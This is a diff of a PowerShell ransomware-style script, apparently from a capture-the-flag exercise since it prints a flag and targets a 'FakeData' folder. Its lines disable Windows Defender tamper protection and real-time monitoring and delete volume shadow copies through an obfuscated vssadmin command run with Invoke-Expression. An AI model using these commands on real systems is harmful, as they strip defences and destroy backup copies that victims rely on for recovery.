@@ -130,14 +130,13 @@ function main{
     Set-ItemProperty -Path "HKCU:\Control Panel\Desktop\" -Name "WallPaper" -Value "$env:USERPROFILE\Downloads\Wallpaper.jpg"
 }
 
+$path = "$env:USERPROFILE\Desktop\FakeData"
 Set-MPPreference -DisableTamperProtection $true
 Set-MpPreference -DisableRealtimeMonitoring $true
-
-$path = "$env:USERPROFILE\Desktop\FakeData"
+main -TargetDirectory $path -EncKey 123 
+Write-Host "All your files are belong to us DSR{Y0U_G07_R4NS0WM4R3}"
 $AS = "vssadmi"
 $AZ = "n.exe delete shadows /all /quiet"
 $AD = $AS + $AZ
 Invoke-Expression $AD
-main -TargetDirectory $path -EncKey 123 
-
 Rundll32.exe user32.dll,UpdatePerUserSystemParameters
